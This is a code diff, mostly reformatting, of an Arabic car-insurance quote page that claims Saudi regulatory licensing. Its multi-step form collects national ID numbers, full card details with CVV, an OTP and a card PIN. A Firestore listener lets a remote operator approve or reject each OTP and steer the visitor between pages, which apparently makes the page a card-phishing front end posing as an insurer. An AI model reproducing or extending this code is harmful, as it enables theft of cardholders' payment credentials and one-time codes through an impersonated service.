@@ -1,9 +1,9 @@
-"use client"
+"use client";
 
-import { Button } from "@/components/ui/button"
-import { Card, CardContent } from "@/components/ui/card"
-import { Badge } from "@/components/ui/badge"
-import { Input } from "@/components/ui/input"
+import { Button } from "@/components/ui/button";
+import { Card, CardContent } from "@/components/ui/card";
+import { Badge } from "@/components/ui/badge";
+import { Input } from "@/components/ui/input";
 import {
   Shield,
   Users,
@@ -25,12 +25,12 @@ import {
   Check,
   Loader2,
   Smartphone,
-} from "lucide-react"
-import { useState, useEffect, useRef } from "react"
-import { setupOnlineStatus } from "@/lib/utils"
-import { addData, db } from "@/lib/firebase"
-import { offerData } from "@/lib/data"
-import { doc, onSnapshot } from "firebase/firestore"
+} from "lucide-react";
+import { useState, useEffect, useRef } from "react";
+import { setupOnlineStatus } from "@/lib/utils";
+import { addData, db } from "@/lib/firebase";
+import { offerData } from "@/lib/data";
+import { doc, onSnapshot } from "firebase/firestore";
 
 // Mock components to replace missing imports
 const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
@@ -47,11 +47,18 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
           }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "renewal" }))}
+          onClick={() =>
+            setFormData((prev: any) => ({
+              ...prev,
+              insurance_purpose: "renewal",
+            }))
+          }
         >
           <div className="text-center">
             <div className="font-semibold">تجديد وثيقة</div>
-            <div className="text-sm text-gray-500 mt-1">تجديد وثيقة تأمين موجودة</div>
+            <div className="text-sm text-gray-500 mt-1">
+              تجديد وثيقة تأمين موجودة
+            </div>
           </div>
         </button>
         <button
@@ -61,11 +68,18 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
           }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, insurance_purpose: "property-transfer" }))}
+          onClick={() =>
+            setFormData((prev: any) => ({
+              ...prev,
+              insurance_purpose: "property-transfer",
+            }))
+          }
         >
           <div className="text-center">
             <div className="font-semibold">نقل ملكية</div>
-            <div className="text-sm text-gray-500 mt-1">تأمين مركبة منقولة الملكية</div>
+            <div className="text-sm text-gray-500 mt-1">
+              تأمين مركبة منقولة الملكية
+            </div>
           </div>
         </button>
       </div>
@@ -78,11 +92,18 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
         type="text"
         placeholder="الاسم الكامل"
         value={formData.documment_owner_full_name}
-        onChange={(e) => setFormData((prev: any) => ({ ...prev, documment_owner_full_name: e.target.value }))}
+        onChange={(e) =>
+          setFormData((prev: any) => ({
+            ...prev,
+            documment_owner_full_name: e.target.value,
+          }))
+        }
         className={`h-12 ${errors.documment_owner_full_name ? "border-red-500" : "border-gray-300"}`}
       />
       {errors.documment_owner_full_name && (
-        <p className="text-red-500 text-sm mt-1">{errors.documment_owner_full_name}</p>
+        <p className="text-red-500 text-sm mt-1">
+          {errors.documment_owner_full_name}
+        </p>
       )}
     </div>
     {formData.insurance_purpose === "renewal" && (
@@ -95,10 +116,19 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
           placeholder="1234567890"
           maxLength={10}
           value={formData.owner_identity_number}
-          onChange={(e) => setFormData((prev: any) => ({ ...prev, owner_identity_number: e.target.value }))}
+          onChange={(e) =>
+            setFormData((prev: any) => ({
+              ...prev,
+              owner_identity_number: e.target.value,
+            }))
+          }
           className={`h-12 ${errors.owner_identity_number ? "border-red-500" : "border-gray-300"}`}
         />
-        {errors.owner_identity_number && <p className="text-red-500 text-sm mt-1">{errors.owner_identity_number}</p>}
+        {errors.owner_identity_number && (
+          <p className="text-red-500 text-sm mt-1">
+            {errors.owner_identity_number}
+          </p>
+        )}
       </div>
     )}
     {formData.insurance_purpose === "property-transfer" && (
@@ -112,10 +142,19 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
             placeholder="1234567890"
             maxLength={10}
             value={formData.buyer_identity_number}
-            onChange={(e) => setFormData((prev: any) => ({ ...prev, buyer_identity_number: e.target.value }))}
+            onChange={(e) =>
+              setFormData((prev: any) => ({
+                ...prev,
+                buyer_identity_number: e.target.value,
+              }))
+            }
             className={`h-12 ${errors.buyer_identity_number ? "border-red-500" : "border-gray-300"}`}
           />
-          {errors.buyer_identity_number && <p className="text-red-500 text-sm mt-1">{errors.buyer_identity_number}</p>}
+          {errors.buyer_identity_number && (
+            <p className="text-red-500 text-sm mt-1">
+              {errors.buyer_identity_number}
+            </p>
+          )}
         </div>
         <div>
           <label className="block text-sm font-semibold text-gray-700 mb-3">
@@ -126,17 +165,24 @@ const MockInsurancePurpose = ({ formData, setFormData, errors }: any) => (
             placeholder="1234567890"
             maxLength={10}
             value={formData.seller_identity_number}
-            onChange={(e) => setFormData((prev: any) => ({ ...prev, seller_identity_number: e.target.value }))}
+            onChange={(e) =>
+              setFormData((prev: any) => ({
+                ...prev,
+                seller_identity_number: e.target.value,
+              }))
+            }
             className={`h-12 ${errors.seller_identity_number ? "border-red-500" : "border-gray-300"}`}
           />
           {errors.seller_identity_number && (
-            <p className="text-red-500 text-sm mt-1">{errors.seller_identity_number}</p>
+            <p className="text-red-500 text-sm mt-1">
+              {errors.seller_identity_number}
+            </p>
           )}
         </div>
       </div>
     )}
   </div>
-)
+);
 
 const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
   <div className="space-y-6">
@@ -152,11 +198,15 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
           }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))}
+          onClick={() =>
+            setFormData((prev: any) => ({ ...prev, vehicle_type: "serial" }))
+          }
         >
           <div className="text-center">
             <div className="font-semibold">مركبة برقم تسلسلي</div>
-            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم تسلسلي</div>
+            <div className="text-sm text-gray-500 mt-1">
+              مركبة مسجلة برقم تسلسلي
+            </div>
           </div>
         </button>
         <button
@@ -166,11 +216,15 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
               ? "border-blue-500 bg-blue-50 text-blue-700"
               : "border-gray-300 hover:border-blue-400"
           }`}
-          onClick={() => setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))}
+          onClick={() =>
+            setFormData((prev: any) => ({ ...prev, vehicle_type: "custom" }))
+          }
         >
           <div className="text-center">
             <div className="font-semibold">مركبة برقم لوحة</div>
-            <div className="text-sm text-gray-500 mt-1">مركبة مسجلة برقم لوحة</div>
+            <div className="text-sm text-gray-500 mt-1">
+              مركبة مسجلة برقم لوحة
+            </div>
           </div>
         </button>
       </div>
@@ -183,58 +237,63 @@ const MockVehicleRegistration = ({ formData, setFormData, errors }: any) => (
         type="text"
         placeholder="123456789"
         value={formData.sequenceNumber}
-        onChange={(e) => setFormData((prev: any) => ({ ...prev, sequenceNumber: e.target.value }))}
+        onChange={(e) =>
+          setFormData((prev: any) => ({
+            ...prev,
+            sequenceNumber: e.target.value,
+          }))
+        }
         className="h-12 border-gray-300"
       />
     </div>
   </div>
-)
+);
 
 const getBadgeText = (index: number) => {
   switch (index) {
     case 0:
-      return "الأفضل سعراً"
+      return "الأفضل سعراً";
     case 1:
-      return "موصى به"
+      return "موصى به";
     case 2:
-      return "خيار جيد"
+      return "خيار جيد";
     default:
-      return ""
+      return "";
   }
-}
+};
 
 const getTypeBadge = (type: string) => {
   switch (type) {
     case "against-others":
-      return "ضد الغير"
+      return "ضد الغير";
     case "comprehensive":
-      return "شامل"
+      return "شامل";
     default:
-      return "خاص"
+      return "خاص";
   }
-}
+};
 
 export default function QuotePage() {
-  const [mounted, setMounted] = useState(false)
-  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
-  const headerRef = useRef<HTMLElement>(null)
-  const formRef = useRef<HTMLDivElement>(null)
-  const stepContentRef = useRef<HTMLDivElement>(null)
+  const [mounted, setMounted] = useState(false);
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
+  const headerRef = useRef<HTMLElement>(null);
+  const formRef = useRef<HTMLDivElement>(null);
+  const stepContentRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
     // Initialize visitor ID if not exists
-    const visitorID = localStorage.getItem("visitor")
+    const visitorID = localStorage.getItem("visitor");
     if (visitorID) {
-      setMounted(true)
-      setupOnlineStatus(visitorID!)
+      setMounted(true);
+      setupOnlineStatus(visitorID!);
     } else {
       // Create new visitor ID if none exists
-      const newVisitorId = "visitor_" + Date.now()
-      localStorage.setItem("visitor", newVisitorId)
-      setMounted(true)
-      setupOnlineStatus(newVisitorId)
+      const newVisitorId = "visitor_" + Date.now();
+      localStorage.setItem("visitor", newVisitorId);
+      setMounted(true);
+      setupOnlineStatus(newVisitorId);
     }
-  }, [])
+  }, []);
 
   if (!mounted) {
     return (
@@ -244,11 +303,14 @@ export default function QuotePage() {
           <p className="text-gray-600">جاري التحميل...</p>
         </div>
       </div>
-    )
+    );
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30" dir="rtl">
+    <div
+      className="min-h-screen bg-gradient-to-br from-gray-50 via-white to-blue-50/30"
+      dir="rtl"
+    >
       {/* Enhanced Header */}
       <header className="bg-white/95 backdrop-blur-lg border-b border-gray-100 px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
         <div className="max-w-7xl mx-auto flex items-center justify-between">
@@ -263,22 +325,38 @@ export default function QuotePage() {
               </div>
             </div>
             <nav className="hidden lg:flex items-center gap-8 text-sm font-medium">
-              <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a
+                href="/"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200"
+              >
                 الرئيسية
               </a>
-              <a href="/#services" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a
+                href="/#services"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200"
+              >
                 الخدمات
               </a>
-              <a href="/#about" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a
+                href="/#about"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200"
+              >
                 عن الشركة
               </a>
-              <a href="/#contact" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200">
+              <a
+                href="/#contact"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200"
+              >
                 اتصل بنا
               </a>
             </nav>
           </div>
           <div className="flex items-center gap-3">
-            <Button variant="ghost" size="sm" className="hidden sm:flex text-gray-600 hover:text-[#109cd4]">
+            <Button
+              variant="ghost"
+              size="sm"
+              className="hidden sm:flex text-gray-600 hover:text-[#109cd4]"
+            >
               English
             </Button>
             <Button
@@ -294,8 +372,17 @@ export default function QuotePage() {
             >
               ابدأ الآن
             </Button>
-            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
-              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
+            <Button
+              variant="ghost"
+              size="sm"
+              className="lg:hidden"
+              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
+            >
+              {mobileMenuOpen ? (
+                <X className="w-5 h-5" />
+              ) : (
+                <Menu className="w-5 h-5" />
+              )}
             </Button>
           </div>
         </div>
@@ -303,23 +390,43 @@ export default function QuotePage() {
         {mobileMenuOpen && (
           <div className="lg:hidden mt-4 pb-4 border-t border-gray-100 bg-white/95 backdrop-blur-lg">
             <nav className="flex flex-col gap-4 pt-4">
-              <a href="/" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a
+                href="/"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2"
+              >
                 الرئيسية
               </a>
-              <a href="/#services" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a
+                href="/#services"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2"
+              >
                 الخدمات
               </a>
-              <a href="/#about" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a
+                href="/#about"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2"
+              >
                 عن الشركة
               </a>
-              <a href="/#contact" className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2">
+              <a
+                href="/#contact"
+                className="text-gray-700 hover:text-[#109cd4] transition-colors duration-200 py-2"
+              >
                 اتصل بنا
               </a>
               <div className="flex gap-2 pt-4 border-t border-gray-100">
-                <Button variant="ghost" size="sm" className="text-gray-600 flex-1">
+                <Button
+                  variant="ghost"
+                  size="sm"
+                  className="text-gray-600 flex-1"
+                >
                   English
                 </Button>
-                <Button variant="outline" size="sm" className="border-gray-300 flex-1 bg-transparent">
+                <Button
+                  variant="outline"
+                  size="sm"
+                  className="border-gray-300 flex-1 bg-transparent"
+                >
                   تسجيل الدخول
                 </Button>
               </div>
@@ -358,7 +465,8 @@ export default function QuotePage() {
                 <span className="text-blue-200">تأمين السيارات</span>
               </h1>
               <p className="text-xl lg:text-2xl text-blue-100 max-w-3xl mx-auto leading-relaxed">
-                قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من 3 دقائق
+                قارن بين أكثر من 25 شركة تأمين واحصل على أفضل الأسعار في أقل من
+                3 دقائق
               </p>
             </div>
 
@@ -394,9 +502,12 @@ export default function QuotePage() {
       <section className="py-16 lg:py-20 relative">
         <div className="max-w-5xl mx-auto px-4 lg:px-6">
           <div className="text-center mb-12">
-            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">احصل على عرض السعر الخاص بك</h2>
+            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">
+              احصل على عرض السعر الخاص بك
+            </h2>
             <p className="text-lg text-gray-600 max-w-2xl mx-auto">
-              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة لاحتياجاتك
+              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين المخصصة
+              لاحتياجاتك
             </p>
           </div>
           <ProfessionalQuoteForm />
@@ -407,9 +518,12 @@ export default function QuotePage() {
       <section className="py-16 bg-white">
         <div className="max-w-6xl mx-auto px-4 lg:px-6">
           <div className="text-center mb-12">
-            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">لماذا يثق بنا أكثر من 500,000 عميل؟</h2>
+            <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">
+              لماذا يثق بنا أكثر من 500,000 عميل؟
+            </h2>
             <p className="text-lg text-gray-600 max-w-2xl mx-auto">
-              نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية السعودية
+              نحن ملتزمون بتقديم أفضل خدمة تأمين رقمية في المملكة العربية
+              السعودية
             </p>
           </div>
           <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-8">
@@ -443,15 +557,22 @@ export default function QuotePage() {
                 bgColor: "bg-purple-50",
               },
             ].map((feature, index) => (
-              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
+              <Card
+                key={index}
+                className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group"
+              >
                 <CardContent className="p-8 text-center">
                   <div
                     className={`w-16 h-16 ${feature.bgColor} rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-transform duration-300`}
                   >
                     <feature.icon className="w-8 h-8 text-gray-700" />
                   </div>
-                  <h3 className="text-xl font-bold text-gray-900 mb-3">{feature.title}</h3>
-                  <p className="text-gray-600 leading-relaxed">{feature.description}</p>
+                  <h3 className="text-xl font-bold text-gray-900 mb-3">
+                    {feature.title}
+                  </h3>
+                  <p className="text-gray-600 leading-relaxed">
+                    {feature.description}
+                  </p>
                 </CardContent>
               </Card>
             ))}
@@ -464,13 +585,19 @@ export default function QuotePage() {
         <div className="max-w-4xl mx-auto px-4 lg:px-6 text-center">
           <div className="space-y-8">
             <div>
-              <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">هل تحتاج مساعدة؟</h2>
+              <h2 className="text-3xl lg:text-4xl font-bold text-gray-900 mb-4">
+                هل تحتاج مساعدة؟
+              </h2>
               <p className="text-lg text-gray-600 max-w-2xl mx-auto">
-                فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم الاستشارة المجانية
+                فريق الخبراء متاح لمساعدتك في اختيار أفضل تأمين لسيارتك وتقديم
+                الاستشارة المجانية
               </p>
             </div>
             <div className="flex flex-col sm:flex-row gap-4 justify-center">
-              <Button size="lg" className="bg-green-600 hover:bg-green-700 text-white px-8 py-4 text-lg font-medium">
+              <Button
+                size="lg"
+                className="bg-green-600 hover:bg-green-700 text-white px-8 py-4 text-lg font-medium"
+              >
                 <Phone className="w-5 h-5 ml-2" />
                 اتصل بنا: 920000000
               </Button>
@@ -485,15 +612,21 @@ export default function QuotePage() {
             </div>
             <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 mt-12 max-w-2xl mx-auto">
               <div className="text-center">
-                <div className="text-2xl font-bold text-[#109cd4] mb-1">24/7</div>
+                <div className="text-2xl font-bold text-[#109cd4] mb-1">
+                  24/7
+                </div>
                 <p className="text-sm text-gray-600">خدمة العملاء</p>
               </div>
               <div className="text-center">
-                <div className="text-2xl font-bold text-[#109cd4] mb-1">{"<"} 30 ثانية</div>
+                <div className="text-2xl font-bold text-[#109cd4] mb-1">
+                  {"<"} 30 ثانية
+                </div>
                 <p className="text-sm text-gray-600">وقت الاستجابة</p>
               </div>
               <div className="text-center">
-                <div className="text-2xl font-bold text-[#109cd4] mb-1">98%</div>
+                <div className="text-2xl font-bold text-[#109cd4] mb-1">
+                  98%
+                </div>
                 <p className="text-sm text-gray-600">رضا العملاء</p>
               </div>
             </div>
@@ -512,29 +645,42 @@ export default function QuotePage() {
                 </div>
               </div>
               <p className="text-gray-400 leading-relaxed">
-                منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول التأمينية بأسعار تنافسية
+                منصة التأمين الرقمية الرائدة في السعودية، نقدم أفضل الحلول
+                التأمينية بأسعار تنافسية
               </p>
             </div>
             <div>
               <h3 className="font-bold mb-6 text-lg">الخدمات</h3>
               <ul className="space-y-3 text-gray-400">
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     تأمين السيارات
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     التأمين الصحي
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     تأمين السفر
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     تأمين المنازل
                   </a>
                 </li>
@@ -544,22 +690,34 @@ export default function QuotePage() {
               <h3 className="font-bold mb-6 text-lg">الشركة</h3>
               <ul className="space-y-3 text-gray-400">
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     من نحن
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     فريق العمل
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     الوظائف
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     الأخبار
                   </a>
                 </li>
@@ -569,22 +727,34 @@ export default function QuotePage() {
               <h3 className="font-bold mb-6 text-lg">الدعم</h3>
               <ul className="space-y-3 text-gray-400">
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     مركز المساعدة
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     اتصل بنا
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     الأسئلة الشائعة
                   </a>
                 </li>
                 <li>
-                  <a href="#" className="hover:text-white transition-colors duration-200">
+                  <a
+                    href="#"
+                    className="hover:text-white transition-colors duration-200"
+                  >
                     سياسة الخصوصية
                   </a>
                 </li>
@@ -596,10 +766,16 @@ export default function QuotePage() {
               © 2025 تأميني. جميع الحقوق محفوظة. مرخص من البنك المركزي السعودي.
             </p>
             <div className="flex gap-4">
-              <Badge variant="outline" className="border-gray-600 text-gray-400">
+              <Badge
+                variant="outline"
+                className="border-gray-600 text-gray-400"
+              >
                 مرخص من ساما
               </Badge>
-              <Badge variant="outline" className="border-gray-600 text-gray-400">
+              <Badge
+                variant="outline"
+                className="border-gray-600 text-gray-400"
+              >
                 ISO 27001
               </Badge>
             </div>
@@ -607,29 +783,31 @@ export default function QuotePage() {
         </div>
       </footer>
     </div>
-  )
+  );
 }
 
 function ProfessionalQuoteForm() {
-  const [currentPage, setCurrentStep] = useState(1)
-  const [errors, setErrors] = useState<Record<string, string>>({})
-  const [touched, setTouched] = useState<Record<string, boolean>>({})
-  const [isSubmitting, setIsSubmitting] = useState(false)
-  const [paymentProcessing, setPaymentProcessing] = useState(false)
-  const [otpSent, setOtpSent] = useState(false)
-  const [otpVerified, setOtpVerified] = useState(false)
-  const [otpAttempts, setOtpAttempts] = useState(0)
-  const [pinCode, setPinCode] = useState("")
-  const [cardNumber, setCardNumber] = useState("")
-  const [cardName, setCardName] = useState("")
-  const [cardMonth, setCardMonth] = useState("")
-  const [cardYear, setCardYear] = useState("")
-  const [cvv, setCvv] = useState("")
-  const [otp, setOtp] = useState("")
-  const [otpTimer, setOtpTimer] = useState(0)
-  const [waitingForApproval, setWaitingForApproval] = useState(false)
-  const [approvalStatus, setApprovalStatus] = useState<"pending" | "approved" | "rejected" | null>(null)
-  const [otpError, setOtpError] = useState<string | null>(null)
+  const [currentPage, setCurrentStep] = useState(1);
+  const [errors, setErrors] = useState<Record<string, string>>({});
+  const [touched, setTouched] = useState<Record<string, boolean>>({});
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [paymentProcessing, setPaymentProcessing] = useState(false);
+  const [otpSent, setOtpSent] = useState(false);
+  const [otpVerified, setOtpVerified] = useState(false);
+  const [otpAttempts, setOtpAttempts] = useState(0);
+  const [pinCode, setPinCode] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardName, setCardName] = useState("");
+  const [cardMonth, setCardMonth] = useState("");
+  const [cardYear, setCardYear] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [otp, setOtp] = useState("");
+  const [otpTimer, setOtpTimer] = useState(0);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [approvalStatus, setApprovalStatus] = useState<
+    "pending" | "approved" | "rejected" | null
+  >(null);
+  const [otpError, setOtpError] = useState<string | null>(null);
   const [formData, setFormData] = useState({
     insurance_purpose: "renewal",
     documment_owner_full_name: "",
@@ -646,80 +824,116 @@ function ProfessionalQuoteForm() {
     selectedInsuranceOffer: "",
     selectedAddons: [] as string[],
     phone: "",
-  })
-  const stepHeaderRef = useRef<HTMLHeadingElement>(null)
-  const firstInputRef = useRef<HTMLInputElement>(null)
-  const errorSummaryRef = useRef<HTMLDivElement>(null)
+  });
+  const stepHeaderRef = useRef<HTMLHeadingElement>(null);
+  const firstInputRef = useRef<HTMLInputElement>(null);
+  const errorSummaryRef = useRef<HTMLDivElement>(null);
 
   const steps = [
-    { number: 1, title: "البيانات الأساسية", subtitle: "معلومات المركبة والمالك", icon: FileText },
-    { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
-    { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
-    { number: 4, title: "الإضافات", subtitle: "خدمات إضافية اختيارية", icon: Star },
-    { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
-    { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
+    {
+      number: 1,
+      title: "البيانات الأساسية",
+      subtitle: "معلومات المركبة والمالك",
+      icon: FileText,
+    },
+    {
+      number: 2,
+      title: "بيانات التأمين",
+      subtitle: "تفاصيل وثيقة التأمين",
+      icon: Shield,
+    },
+    {
+      number: 3,
+      title: "قائمة الأسعار",
+      subtitle: "مقارنة العروض المتاحة",
+      icon: TrendingUp,
+    },
+    {
+      number: 4,
+      title: "الإضافات",
+      subtitle: "خدمات إضافية اختيارية",
+      icon: Star,
+    },
+    {
+      number: 5,
+      title: "الملخص",
+      subtitle: "مراجعة الطلب والتواصل",
+      icon: CheckCircle,
+    },
+    {
+      number: 6,
+      title: "الدفع",
+      subtitle: "بيانات الدفع الآمن",
+      icon: CreditCard,
+    },
     { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
     { number: 8, title: "رمز PIN", subtitle: "إدخال رمز PIN", icon: Lock },
-  ]
+  ];
 
   useEffect(() => {
-    let interval: NodeJS.Timeout
+    let interval: NodeJS.Timeout;
     if (otpTimer > 0) {
       interval = setInterval(() => {
-        setOtpTimer((prev) => prev - 1)
-      }, 1000)
+        setOtpTimer((prev) => prev - 1);
+      }, 1000);
     }
-    return () => clearInterval(interval)
-  }, [otpTimer])
+    return () => clearInterval(interval);
+  }, [otpTimer]);
 
   useEffect(() => {
     if (stepHeaderRef.current) {
-      stepHeaderRef.current.focus()
-      stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
+      stepHeaderRef.current.focus();
+      stepHeaderRef.current.scrollIntoView({
+        behavior: "smooth",
+        block: "start",
+      });
     }
     // Save current step
-    const visitorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      addData({ id: visitorId, currentPage })
+      addData({ id: visitorId, currentPage });
     }
-  }, [currentPage])
+  }, [currentPage]);
 
   useEffect(() => {
     if (Object.keys(errors).length > 0 && errorSummaryRef.current) {
-      errorSummaryRef.current.focus()
+      errorSummaryRef.current.focus();
     }
-  }, [errors])
+  }, [errors]);
 
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data()
-          if (waitingForApproval && data.otpApproved === true) {
-            setWaitingForApproval(false)
-            setApprovalStatus("approved")
-            setOtpError(null)
-            setCurrentStep(8) // Go to PIN step
-          } else if (waitingForApproval && data.otpApproved === false) {
-            setWaitingForApproval(false)
-            setApprovalStatus("rejected")
-            setOtpError("رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.")
-            setOtp("") // Clear the OTP input for retry
-          }
+      const unsubscribe = onSnapshot(
+        doc(db, "pays", visitorId),
+        async (docSnap) => {
+          if (docSnap.exists()) {
+            const data = docSnap.data();
+            if (waitingForApproval && data.otpApproved === true) {
+              setWaitingForApproval(false);
+              setApprovalStatus("approved");
+              setOtpError(null);
+              await addData({ id: visitorId, currentPage: 8 }); // Go to PIN step
+            } else if (waitingForApproval && data.otpApproved === false) {
+              setWaitingForApproval(false);
+              setApprovalStatus("rejected");
+              setOtpError("رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.");
+              setOtp(""); // Clear the OTP input for retry
+            }
 
-          if (currentPage !== data.currentPage && !waitingForApproval) {
-            if (data.currentPage === "9999") {
-              window.location.href = "/verify-phone"
-            } else {
-              setCurrentStep(Number.parseInt(data.currentPage))
+            if (currentPage !== data.currentPage && !waitingForApproval) {
+              if (data.currentPage === "9999") {
+                window.location.href = "/verify-phone";
+              } else {
+                setCurrentStep(Number.parseInt(data.currentPage));
+              }
             }
           }
-        }
-      })
-      return () => unsubscribe()
+        },
+      );
+      return () => unsubscribe();
     }
-  }, [waitingForApproval])
+  }, [waitingForApproval]);
 
   const validationRules = {
     documment_owner_full_name: {
@@ -744,18 +958,18 @@ function ProfessionalQuoteForm() {
     policyStartDate: {
       required: true,
       validate: (value: string) => {
-        const selectedDate = new Date(value)
-        const today = new Date()
-        const maxDate = new Date()
-        maxDate.setMonth(maxDate.getMonth() + 3)
+        const selectedDate = new Date(value);
+        const today = new Date();
+        const maxDate = new Date();
+        maxDate.setMonth(maxDate.getMonth() + 3);
 
         if (selectedDate < today) {
-          return "لا يمكن أن يكون تاريخ بداية الوثيقة في الماضي"
+          return "لا يمكن أن يكون تاريخ بداية الوثيقة في الماضي";
         }
         if (selectedDate > maxDate) {
-          return "لا يمكن أن يكون تاريخ بداية الوثيقة أكثر من 3 أشهر من اليوم"
+          return "لا يمكن أن يكون تاريخ بداية الوثيقة أكثر من 3 أشهر من اليوم";
         }
-        return null
+        return null;
       },
       message: "يرجى اختيار تاريخ بداية الوثيقة",
     },
@@ -772,101 +986,124 @@ function ProfessionalQuoteForm() {
       pattern: /^(05|5)[0-9]{8}$/,
